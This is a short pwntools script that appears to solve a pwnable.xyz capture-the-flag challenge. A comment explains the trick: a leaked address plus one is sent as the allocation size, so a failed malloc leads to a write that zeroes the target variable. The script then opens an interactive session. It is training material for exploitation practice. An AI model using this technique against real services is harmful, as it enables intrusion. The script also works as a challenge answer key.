#v5 will be 0 if malloc process is abnormal. v5[size-1]=0 <- size can be controlled. We know the address of v3. So let's make *v3=0!
from pwn import *
s=remote("svc.pwnable.xyz",30000)
s.recvuntil("Leak: 0x")
leak=s.recvuntil("\n")
leak=int(leak,16)
print(hex(leak))
s.recv(1024)
s.send(str(leak+1)+"\n")
s.recv(1024)
s.send("\n")
s.interactive()
s.close()